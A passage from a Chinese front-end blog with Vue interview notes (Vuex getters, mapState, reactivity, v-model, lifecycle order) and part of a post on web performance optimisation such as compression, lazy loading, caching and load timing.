<h2 id="getters"><a href="#getters" class="headerlink" title="getters"></a>getters</h2></li>
<li>this.$store.getters.xxxgetters访问回调函数，</li>
<li>getter执行结果绑定到this.$store上。<ul>
<li>resetStoreVM 函数重置一个<strong>私有的 _vm 对象</strong>，保留<strong>state树</strong>，以及用<strong>计算属性的方式</strong>存储了 store 的 getters<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(store.getters, key, &#123;</span><br><span class="line">  <span class="keyword">get</span>: () =&gt; store._vm[key]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ol>
<h2 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h2><h3 id="mapState"><a href="#mapState" class="headerlink" title="mapState"></a>mapState</h3><p>将数组转换成{key, val: key}的对象，将对象转换成{ key, val: obj[key] }的对象返回结果</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">mapState</span> (<span class="params">states</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> res = &#123;&#125;</span><br><span class="line">  normalizeMap(states).forEach(<span class="function">(<span class="params">&#123; key, val &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    res[key] = <span class="function"><span class="keyword">function</span> <span class="title">mappedState</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">typeof</span> val === <span class="string">'function'</span></span><br><span class="line">        ? val.call(<span class="keyword">this</span>, <span class="keyword">this</span>.$store.state, <span class="keyword">this</span>.$store.getters)</span><br><span class="line">        : <span class="keyword">this</span>.$store.state[val]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">normalizeMap</span> (<span class="params">map</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.isArray(map)</span><br><span class="line">    ? map.map(<span class="function"><span class="params">key</span> =&gt;</span> (&#123; key, <span class="attr">val</span>: key &#125;))</span><br><span class="line">    : <span class="built_in">Object</span>.keys(map).map(<span class="function"><span class="params">key</span> =&gt;</span> (&#123; key, <span class="attr">val</span>: map[key] &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Vue-的响应式原理中-Object-defineProperty-有什么缺陷？"><a href="#Vue-的响应式原理中-Object-defineProperty-有什么缺陷？" class="headerlink" title="Vue 的响应式原理中 Object.defineProperty 有什么缺陷？"></a>Vue 的响应式原理中 Object.defineProperty 有什么缺陷？</h1><p>为什么在 Vue3.0 采用了 Proxy，抛弃了 Object.defineProperty？</p>
<ul>
<li>Object.defineProperty无法监控到数组下标的变化，导致通过数组下标添加元素，不能实时响应；(尤雨溪：defineProperty可以检测数组下标，但是收益与性能不成正比)</li>
<li>Object.defineProperty只能劫持对象的属性，从而需要对每个对象，每个属性进行遍历，如果，属性值是对象，还需要深度遍历。Proxy可以劫持整个对象，并返回一个新的对象。</li>
<li>Proxy不仅可以代理对象，还可以代理数组。还可以代理动态增加的属性。</li>
</ul>
<h1 id="Vue-的双向数据绑定，Model-如何改变-View，View-又是如何改变-Model-的？"><a href="#Vue-的双向数据绑定，Model-如何改变-View，View-又是如何改变-Model-的？" class="headerlink" title="Vue 的双向数据绑定，Model 如何改变 View，View 又是如何改变 Model 的？"></a>Vue 的双向数据绑定，Model 如何改变 View，View 又是如何改变 Model 的？</h1><p>双向数据绑定无非就是在单向绑定的基础上给可输入元素（input、textare等）添加了change(input)事件，来动态修改model和 view</p>
<p>vue.js 采用<strong>数据劫持</strong>结合<strong>发布者-订阅者模式</strong>的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。</p>
<p>要实现mvvm的双向绑定，就必须要实现以下几点： </p>
<ol>
<li>实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者 </li>
<li>实现一个指令解析器Compile(render+patch)，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数 </li>
<li>实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图<br><img src="https://raw.githubusercontent.com/DMQ/mvvm/master/img/2.png" alt="MVVM"></li>
</ol>
<p>利用Obeject.defineProperty()来监听属性变动 那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter 这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。</p>
<p>监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法</p>
<p>订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就必须要在闭包内操作</p>
<p>Watcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是: </p>
<ol>
<li>在自身实例化时往属性订阅器(dep)里面添加自己 </li>
<li>自身必须有一个update()方法 </li>
<li>待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调</li>
</ol>
<p>实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcher实例就能收到更新通知。</p>
<p>Component类中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>._ob = observe(options.data)</span><br></pre></td></tr></table></figure>
<h2 id="model-gt-view"><a href="#model-gt-view" class="headerlink" title="model -&gt; view"></a>model -&gt; view</h2><p>数据驱动视图<br>在 vue 2.x 中 通过 </p>
<ul>
<li><p>observe添加数据响应</p>
<ul>
<li>给数据添加一个Observer对象实例附加在obj.<strong>ob</strong>上</li>
<li>defineProperty 实现的数据劫持</li>
<li>闭包形式给数据添加Dep实例</li>
</ul>
</li>
<li><p><strong>getter 收集依赖</strong></p>
<ul>
<li><strong>const dep = new Dep() // 实例化一个Dep实例</strong></li>
<li><strong>在get函数中通过dep.depend做依赖收集</strong></li>
</ul>
</li>
<li><p>什么时候触发getter收集依赖？</p>
<ul>
<li>实例化一个渲染watcher=&gt; watcher的构造函数=&gt;this.get()，<ul>
<li>get函数把Dep.target赋值为当前渲染watcher并压栈（为了恢复)</li>
</ul>
</li>
<li>vm._render()生成渲染VNode,并且在这个过程对vm上的数据访问触发getter</li>
<li>(在此期间执行Dep.target.addDep(this)方法，将watcher订阅到这个数据持有的dep的subs中，为后续数据变化时通知到哪些subs做准备)</li>
<li>每次数据变化都会vm._render()方法会再次执行，并再次触发数据</li>
</ul>
</li>
<li><p><strong>setter 调用更新回调</strong></p>
<ul>
<li><strong>childOb = !shallow &amp;&amp; observe(newVal) // 如果shallow为false的情况，会对新设置的值变成一个响应式对象</strong></li>
<li><strong>dep.notify() // 通知所有订阅者</strong></li>
</ul>
</li>
<li><p>派发过程：当我们组件中对响应的数据做了修改，就会触发setter的逻辑，最后调用dep.notify()方法，遍历依赖收集中建立的subs，也就是Watcher的实例数组【subs数组在依赖收集getter中被添加，期间通过一些逻辑处理判断保证同一数据不会被添加多次】，然后调用每一个watcher的update方法。</p>
</li>
<li><p>update函数中有个 <strong>queueWatcher(this)</strong> 方法引入了队列的概念，是vue在做派发更新时优化的一个点，它并不会每次数据改变都会触发watcher回调，而是把这些watcher先添加到一个队列中，然后在nextTick后执行watcher的run函数</p>
</li>
</ul>
<p>队列排序保证：</p>
<ul>
<li>组件的更新由父到子。父组件创建早于子组件，watcher的创建也是</li>
<li>用户自定义watcher要早于渲染watcher执行，因为用户自定义watcher是在渲染watcher前创建的</li>
<li>如果一个组件在父组件watcher执行期间被销毁，那么它对应的watcher执行都可以被跳过，所以父组件的watcher应该先执行。</li>
</ul>
<p>队列遍历：排序完成后，对队列进行遍历，拿到对应的watcher,执行watcher.run()。 </p>
<ol>
<li>通过this.get()得到它当前的值,判断新旧值不同执行watcher回调</li>
<li>渲染watcher而言，在执行this.get()方法求值的时候，会执行getter方法，重新patch</li>
</ol>
<h3 id="Dep"><a href="#Dep" class="headerlink" title="Dep"></a>Dep</h3><ul>
<li>Dep.target 全局唯一Watcher</li>
<li>this.deps = []; this.depIds = new Set()</li>
<li>this.newDeps = [];this.newDepIds = new Set()    </li>
</ul>
<h2 id="数据绑定原理"><a href="#数据绑定原理" class="headerlink" title="数据绑定原理"></a>数据绑定原理</h2><p><img src="https://i.loli.net/2019/07/15/5d2c20df68a3346321.jpg" alt="数据绑定"></p>
<h2 id="view-gt-model"><a href="#view-gt-model" class="headerlink" title="view -&gt; model"></a>view -&gt; model</h2><p>通过 v-model 的方式,如果一个组件有多个 v-model ，你要自己写 v-on 和 data 的修改。</p>
<p>编译时：<br>v-model的相关信息保存在AST树的atrrsList数组和指令directive属性上，生成render函数时，这些属性上的信息通过</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addProp(el, <span class="string">'value'</span>, <span class="string">`(<span class="subst">$&#123;value&#125;</span>)`</span>)</span><br><span class="line">addHandler(el, event, code, <span class="literal">null</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<p>方法添加到render的data中，v-model生成的代码作为语法糖，即通过修改 AST 元素，给 el 添加一个 prop，相当于我们在 input 上动态绑定了 value，又给 el 添加了事件处理，相当于在 input 上绑定了 input 事件，</p>
<figure class="highlight plain"><figcaption><span>v-model</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&gt;</span><br><span class="line">&#96;&#96;&#96;&lt;input v-bind:value&#x3D;&quot;message&quot; @input&#x3D;&quot;message&#x3D;$event.target.value&quot;&gt;&#96;&#96;&#96; v-model 的实现，子组件的 value prop 以及派发的 input 事件名是可配的</span><br><span class="line">&#96;&#96;&#96;js</span><br><span class="line">model:&#123;</span><br><span class="line">    prop:&#39;msg&#39;,</span><br><span class="line">    event:&#39;change&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="v-model-表单vs组件"><a href="#v-model-表单vs组件" class="headerlink" title="v-model 表单vs组件"></a>v-model 表单vs组件</h2><table>
<thead>
<tr>
<th></th>
<th>表单</th>
<th>组件</th>
</tr>
</thead>
<tbody><tr>
<td>编译prase阶段的AST树</td>
<td>生成directives属性</td>
<td>生成 model属性</td>
</tr>
<tr>
<td>编译codegen阶段的data</td>
<td>props和event</td>
<td>model = {callback: “function ($$v) {message=$$v}”, expression: “message”, value: “(message)”}</td>
</tr>
<tr>
<td>运行阶段</td>
<td>updateDOMListeners-&gt; addEventListener</td>
<td>initEvent -&gt; 将回调函数挂载在vm实例上，并配合$emit实现</td>
</tr>
</tbody></table>
<h1 id="虚拟DOM"><a href="#虚拟DOM" class="headerlink" title="虚拟DOM"></a>虚拟DOM</h1><p>vdom 的真正意义是为了实现跨平台，服务端渲染，以及提供一个性能还算不错 Dom 更新策略。</p>
<h1 id="在-Vue-中，子组件为何不可以修改父组件传递的-Prop？"><a href="#在-Vue-中，子组件为何不可以修改父组件传递的-Prop？" class="headerlink" title="在 Vue 中，子组件为何不可以修改父组件传递的 Prop？"></a>在 Vue 中，子组件为何不可以修改父组件传递的 Prop？</h1><p>原因很简单，一个父组件下不只有你一个子组件。 同样，使用这份 prop 数据的也不只有你一个子组件。 如果每个子组件都能修改 prop 的话，将会导致修改数据的源头不止一处。</p>
<p>所以我们需要将修改数据的源头统一为父组件，子组件像要改 prop 只能委托父组件帮它。从而保证数据修改源唯一</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">initProps()&#123;……</span><br><span class="line">defineReactive(props, key, value, () =&gt; &#123;</span><br><span class="line">    <span class="comment">//如果不是root根组件，并且不是更新子组件，那么说明更新的是props</span></span><br><span class="line">    <span class="keyword">if</span> (!isRoot &amp;&amp; !isUpdatingChildComponent) &#123;</span><br><span class="line">      warn(……）</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;……&#125;</span><br></pre></td></tr></table></figure>
<h1 id="生命周期顺序？"><a href="#生命周期顺序？" class="headerlink" title="生命周期顺序？"></a>生命周期顺序？</h1><p>加载渲染过程</p>
<ul>
<li>父beforeCreate-&gt;父created-&gt;父beforeMount-&gt;子beforeCreate-&gt;子created-&gt;子beforeMount-&gt;子mounted-&gt;父mounted</li>
</ul>
<p>子组件全局状态更新过程</p>
<ul>
<li>父beforeUpdate-&gt;子beforeUpdate-&gt;子updated-&gt;父updated</li>
</ul>
<p>销毁过程</p>
<ul>
<li>父beforeDestroy-&gt;子beforeDestroy-&gt;子destroyed-&gt;父destroyed</li>
</ul>
<h2 id="生命周期的意义"><a href="#生命周期的意义" class="headerlink" title="生命周期的意义"></a>生命周期的意义</h2><p>创建-挂载-更新-销毁</p>
<ul>
<li>beforeCreate前，也就是new Vue的时候会初始化事件和生命周期；</li>
<li>beforeCreate和created之间会挂载Data，绑定事件；接下来会根据el挂载页面元素，如果没有设置el则生命周期结束，直到手动挂载；el挂载结束后，根据templete/outerHTML(el)渲染页面；</li>
<li>在beforeMount前虚拟DOM已经创建完成；</li>
<li>之后在mounted前，将vm.$el替换掉页面元素el;mounted将虚拟dom挂载到真实页面（此时页面已经全部渲染完成）；</li>
<li>之后发生数据变化时触发beforeUpdate和updated进行一些操作；</li>
<li>最后主动调用销毁函数或者组件自动销毁时beforeDestroy，手动撤销监听事件，计时器等；</li>
<li>destroyed时仅存在Dom节点，其他所有东西已自动销毁。</li>
</ul>
<h1 id="Vue-router中-lt-router-link-gt-和-lt-a-href-”…”-gt-的区别？"><a href="#Vue-router中-lt-router-link-gt-和-lt-a-href-”…”-gt-的区别？" class="headerlink" title="Vue-router中&lt;router-link&gt; 和&lt;a href=”…” &gt;的区别？"></a>Vue-router中&lt;router-link&gt; 和&lt;a href=”…” &gt;的区别？</h1><p>router-link 组件支持用户在具有路由功能的应用中 (点击) 导航。 通过 to 属性指定目标地址，默认渲染成带有正确链接的 a 标签，可以通过配置 tag 属性生成别的标签.。另外，当目标路由成功激活时，链接元素自动设置一个表示激活的 CSS 类名。</p>
<p>&lt;router-link&gt; 比起写死的&lt;a href=”…” &gt; 会好一些，理由如下：</p>
<p>无论是 HTML5 history 模式还是 hash 模式，它的表现行为一致，所以，当你要切换路由模式，或者在 IE9 降级使用 hash 模式，无须作任何变动。<br>在 HTML5 history 模式下，router-link 会守卫点击事件，让浏览器不再重新加载页面。<br>当你在 HTML5 history 模式下使用 base 选项之后，所有的 to 属性都不需要写 (基路径) 了。</p>
<h1 id="v-for有必要添加事件代理吗？"><a href="#v-for有必要添加事件代理吗？" class="headerlink" title="v-for有必要添加事件代理吗？"></a>v-for有必要添加事件代理吗？</h1><p>没必要  </p>
<p>首先我们需要知道事件代理主要有什么作用？    </p>
<ul>
<li><p>事件代理能够避免我们逐个的去给元素新增和删除事件</p>
</li>
<li><p>事件代理比每一个元素都绑定一个事件性能要更好<br>从vue的角度上来看上面两点   </p>
</li>
<li><p>在v-for中，我们直接用一个for循环就能在模板中将每个元素都绑定上事件，并且当组件销毁时，vue也会自动给我们将所有的事件处理器都移除掉。所以事件代理能做到的第一点vue已经给我们做到了</p>
</li>
<li><p>在v-for中，给元素绑定的都是相同的事件，所以除非上千行的元素需要加上事件，其实和使用事件代理的性能差别不大，所以也没必要用事件代理</p>
</li>
</ul>
<h1 id="vue首屏白屏？"><a href="#vue首屏白屏？" class="headerlink" title="vue首屏白屏？"></a>vue首屏白屏？</h1><p>首页白屏的原因： 单页面应用的 html 是靠 js 生成，因为首屏需要加载很大的js文件(app.js vendor.js)，所以当网速差的时候会产生一定程度的白屏</p>
<p>解决办法：</p>
<ul>
<li>优化 webpack 减少模块打包体积，code-split 按需加载</li>
<li>服务端渲染，在服务端事先拼装好首页所需的 html</li>
<li>首页加骨架屏</li>
<li>使用CDN减小代码体积加快请求速度</li>
<li>vue-router 路由懒加载</li>
<li>nginx楷gzip压缩</li>
</ul>
<h1 id="vue-是如何对数组方法进行变异的？"><a href="#vue-是如何对数组方法进行变异的？" class="headerlink" title="vue 是如何对数组方法进行变异的？"></a>vue 是如何对数组方法进行变异的？</h1><p>重写了数组中的那些方法，首先获取到这个数组的<strong>ob</strong>,也就是它的Observer对象，如果有新的值，就调用observeArray继续对新的值观察变化，然后手动调用notify，通知渲染watcher，执行update</p>
<p>Vue中默认的做法就是在数组实例与它的原型之间，插入了一个新的原型对象，这个原型方法实现了这些变异方法，也就拦截了真正数组原型上的方法（因为原型链的机制，找到了就不会继续往上找了）。 变异方法中增加了自定义逻辑，也调用了真正数组原型上的方法，即实现了目的，也不会对正常使用造成影响。</p>
<h1 id="观察者模式和发布-订阅模式有什么区别？"><a href="#观察者模式和发布-订阅模式有什么区别？" class="headerlink" title="观察者模式和发布-订阅模式有什么区别？"></a>观察者模式和发布-订阅模式有什么区别？</h1><p>观察者模式没中间商赚差价<br>发布订阅模式 有中间商赚差价</p>
<h1 id="github上的问题"><a href="#github上的问题" class="headerlink" title="github上的问题"></a>github上的问题</h1><h2 id="vue组件之间的通信都有哪些？"><a href="#vue组件之间的通信都有哪些？" class="headerlink" title="vue组件之间的通信都有哪些？"></a>vue组件之间的通信都有哪些？</h2><p>父子Coms: </p>
<ul>
<li>props</li>
<li>$emit/$on</li>
<li>( $parents/$children ) / $refs</li>
</ul>
<p>兄弟Coms:</p>
<ul>
<li>Vuex</li>
<li>Bus</li>
</ul>
<p>跨级Coms: </p>
<ul>
<li>( provide/inject )</li>
<li>( $attrs/$listeners )</li>
</ul>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vue/" rel="tag">Vue</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="tag">面试题</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-前端性能优化" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2018/12/22/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"
    >前端性能优化</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2018/12/22/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="article-date">
  <time datetime="2018-12-21T16:15:28.000Z" itemprop="datePublished">2018-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/">前端理论</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h2 id="请求速度"><a href="#请求速度" class="headerlink" title="请求速度"></a>请求速度</h2><h2 id="缓存-路径选择"><a href="#缓存-路径选择" class="headerlink" title="缓存 路径选择"></a>缓存 路径选择</h2><h2 id="http请求大小-减少http请求"><a href="#http请求大小-减少http请求" class="headerlink" title="http请求大小 减少http请求"></a>http请求大小 减少http请求</h2><h2 id="首屏-vue服务端渲染"><a href="#首屏-vue服务端渲染" class="headerlink" title="首屏 vue服务端渲染"></a>首屏 vue服务端渲染</h2><h2 id="减少请求数量"><a href="#减少请求数量" class="headerlink" title="减少请求数量"></a>减少请求数量</h2><h2 id="减少请求大小"><a href="#减少请求大小" class="headerlink" title="减少请求大小"></a>减少请求大小</h2><h3 id="html压缩"><a href="#html压缩" class="headerlink" title="html压缩"></a>html压缩</h3><p>不显示空格、制表符、换行符，以及压缩注释</p>
<h3 id="css压缩"><a href="#css压缩" class="headerlink" title="css压缩"></a>css压缩</h3><ul>
<li>去掉回车和空格</li>
<li>无效代码删除</li>
<li>css语义合并</li>
</ul>
<h3 id="js压缩"><a href="#js压缩" class="headerlink" title="js压缩"></a>js压缩</h3><ul>
<li>无效字符的删除，注释回车空格</li>
<li>代码语义的缩减和优化 </li>
<li>代码混乱降低代码可读性，代码保护，防止内部逻辑泄露</li>
</ul>
<h3 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h3><p>虽然使用keep-alive保证长连接，但依旧是串行的请求，多次发送请求来获得不同的资源</p>
<p>文件合并，只需发起一次请求</p>
<p>存在问题：</p>
<ul>
<li><p>首屏渲染等待合并后的js文件加载完后才会进行渲染，首屏渲染时间增加</p>
</li>
<li><p>缓存失效，更改一小部分js代码，就需要重新下载新的合并的js文件</p>
</li>
<li><p>公共库合并，公共库代码改动较少，业务代码打包成一个文件</p>
</li>
<li><p>不同页面的js文件单独打包</p>
</li>
</ul>
<h2 id="图片相关优化"><a href="#图片相关优化" class="headerlink" title="图片相关优化"></a>图片相关优化</h2><ul>
<li>雪碧图，将多张图片合并到一张单独的图片，来减少http请求数量</li>
<li>image inline，使用base64格式保存在html页面中，减少http请求</li>
<li>使用矢量图 svg</li>
</ul>
<h2 id="css-js-加载"><a href="#css-js-加载" class="headerlink" title="css js 加载"></a>css js 加载</h2><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><ul>
<li>顺序执行，并发加载，但是同一个域名下并发加载的数量有限</li>
<li>css header中阻塞页面的渲染，而@import所引用的 css 会等到<strong>页面加载完</strong>才被加载</li>
<li>css 阻塞js执行，不阻塞js的加载<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"****.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="keyword">@import</span> <span class="string">"***.css"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><ul>
<li>直接引入的js的会阻塞页面的渲染（同步加载），（defer async异步加载）</li>
<li>js的执行不会阻塞资源的加载</li>
<li>js顺序执行，会阻塞之后的js执行</li>
</ul>
<h3 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h3><p>较少无效的资源加载，由于同一个域名下资源的请求数量有限，防止图片的加载阻塞js文件的加载</p>
<ol>
<li>设置 data-src = url;</li>
<li>当图片进入可视区域，将 src设置为 data-src</li>
</ol>
<h3 id="预加载"><a href="#预加载" class="headerlink" title="预加载"></a>预加载</h3><p>图片等静态资源在使用之前提前请求，当需要使用该资源时直接从缓存中加载</p>
<ul>
<li>设置 display:none</li>
<li>使用Image对象 <code>var image = new Image(); imgahe.src=url</code></li>
<li>XMLHttpRequest 请求图片,但会有跨域问题<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XMLhttpRequest()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="减少-重绘-回流"><a href="#减少-重绘-回流" class="headerlink" title="减少 重绘 回流"></a>减少 重绘 回流</h2><p>ui的渲染线程会冻结 js线程的执行</p>
<ul>
<li>将会触发回流的样式，使用不触发回流的方式实现</li>
<li>将频繁重绘回流的dom元素作为一个单独的图层，那么他的重绘回流只会影响当前图层。（少用，图层的合并计算量非常大）<ul>
<li>创建图层的条件： perspective transform video webgl canvas 动画 </li>
</ul>
</li>
<li></li>
</ul>
<h2 id="浏览器存储"><a href="#浏览器存储" class="headerlink" title="浏览器存储"></a>浏览器存储</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>域名下的所有请求都会带上cookie，造成流量的浪费， </p>
<p>解决：cdn域名和主站域名要分开，在请求静态文件时不携带cookie</p>
<h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><p>进行本地缓存，（js方法，css，icon图片，浏览器能力检测结果）提升首屏渲染速度，以及函数调用的速度</p>
<p>setItem getItem</p>
<h3 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h3><p>不小心将页面刷新，也能将信息从sessionStorage中读取</p>
<h3 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h3><p>存储客户端大量的结构化数据</p>
<h2 id="浏览器缓存"><a href="#浏览器缓存" class="headerlink" title="浏览器缓存"></a>浏览器缓存</h2><h2 id="服务端优化"><a href="#服务端优化" class="headerlink" title="服务端优化"></a>服务端优化</h2><p>减少前端的计算</p>
<h3 id="vue-ssr"><a href="#vue-ssr" class="headerlink" title="vue-ssr"></a>vue-ssr</h3><p>服务端渲染</p>
<p>Vue.js 是构建客户端应用程序的框架。默认情况下，可以在浏览器中输出 Vue 组件，进行生成 DOM 和操作 DOM。然而，也可以将同一个组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器，最后将这些静态标记”激活”为客户端上完全可交互的应用程序。</p>
<h2 id="首次加载白屏时间"><a href="#首次加载白屏时间" class="headerlink" title="首次加载白屏时间"></a>首次加载白屏时间</h2><p>可以通过 perpormance 来获取相关信息</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> timing = performance.timing,</span><br><span class="line">    start = timing.navigationStart,</span><br><span class="line">    dnsTime = <span class="number">0</span>,</span><br><span class="line">    tcpTime = <span class="number">0</span>,</span><br><span class="line">    firstPaintTime = <span class="number">0</span>,</span><br><span class="line">    domRenderTime = <span class="number">0</span>,</span><br><span class="line">    loadTime = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">dnsTime = timing.domainLookupEnd - timing.domainLookupStart; <span class="comment">//DNS解析时间</span></span><br><span class="line">tcpTime = timing.connectEnd - timing.connectStart; <span class="comment">//TCP建立时间</span></span><br><span class="line">firstPaintTime = timing.responseStart - start; <span class="comment">//首屏时间</span></span><br><span class="line">domRenderTime = timing.domContentLoadedEventEnd - start; <span class="comment">//dom渲染完成时间</span></span><br><span class="line">loadTime = timing.loadEventEnd - start; <span class="comment">//页面onload时间</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'DNS解析时间:'</span>, dnsTime, </span><br><span class="line">            <span class="string">'\nTCP建立时间:'</span>, tcpTime, </span><br><span class="line">            <span class="string">'\n首屏时间:'</span>, firstPaintTime,</span><br><span class="line">            <span class="string">'\ndom渲染完成时间:'</span>, domRenderTime, </span><br><span class="line">            <span class="string">'\n页面onload时间:'</span>, loadTime);</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>减少网络请求数量和请求大小，以及传输数据的大小</p>
<ul>
<li>合并文件，文件的压缩（去除空格、注释、换行符），图片（雪碧图，image inline，base64）头部压缩</li>
<li>cdn 域名和服务器域名区分开，提高并行的请求数量，也可以减少不必要的cookie</li>
<li>缓存 DNS 结果</li>
<li>缓存一些静态资源，如icon、js通用方法到localStorage</li>
</ul>
</li>
<li><p>将javascript脚本放在底部，js的执行会阻塞页面的渲染</p>
<ul>
<li>html顺序解析执行，加载是并发的</li>
<li>css 在head中通过 link方法引入，css加载会阻塞页面的渲染</li>
<li>css 加载 阻塞 js的执行，不阻塞加载</li>
<li>直接引入的js加载会阻塞 页面渲染  （defer async）</li>
<li>js顺序执行，阻塞后续js的执行</li>
</ul>
</li>
<li><p>将CSS样式表放在顶部，因为页面的渲染需要css的加载完毕，非则会出现白屏，所以使用 <code>&lt;link&gt;</code> 来代替 @import</p>
</li>
<li><p>懒加载 预加载</p>
</li>
<li><p>减少重绘回流</p>
<ul>
<li>css <ul>
